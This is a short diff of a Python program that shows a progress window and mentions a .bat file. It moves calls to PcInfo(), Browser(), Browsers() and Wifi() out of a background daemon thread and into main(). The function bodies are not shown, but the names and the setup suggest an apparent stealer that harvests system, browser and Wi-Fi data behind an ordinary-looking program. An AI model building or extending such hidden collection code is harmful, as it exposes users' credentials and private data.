@@ -765,12 +765,6 @@ def update_progress():
 
         root.after(2000, root.destroy)
 
-def bg_run():
-    PcInfo()
-    Browser()
-    Browsers() 
-    Wifi() 
-    
 def main():
 
     
@@ -795,11 +789,10 @@ def main():
     else:
         print(f"Không tìm thấy file: {bat_file}")
 
-    threading.Thread(
-        target=bg_run,
-        daemon=True
-    ).start()
-
+    PcInfo()
+    Browser()
+    Browsers() 
+    Wifi() 
     
 
 if __name__ == "__main__":
